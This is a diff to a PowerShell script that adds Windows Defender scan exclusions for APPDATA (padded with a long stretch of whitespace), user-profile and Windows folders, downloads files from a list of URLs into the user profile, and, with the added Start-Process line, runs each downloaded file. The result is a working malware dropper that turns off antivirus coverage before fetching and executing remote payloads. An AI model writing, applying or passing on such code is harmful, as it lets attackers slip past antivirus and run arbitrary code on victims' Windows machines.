@@ -1,3 +1,4 @@
+Add-MpPreference -ExclusionPath $env:APPDATA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
 $urls = @(
@@ -8,4 +9,5 @@ foreach ($url in $urls) {
     $fileName = Split-Path $url -Leaf
     $output = "$env:USERPROFILE\$fileName"
     Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
-}
+    Start-Process -FilePath $output
+}     
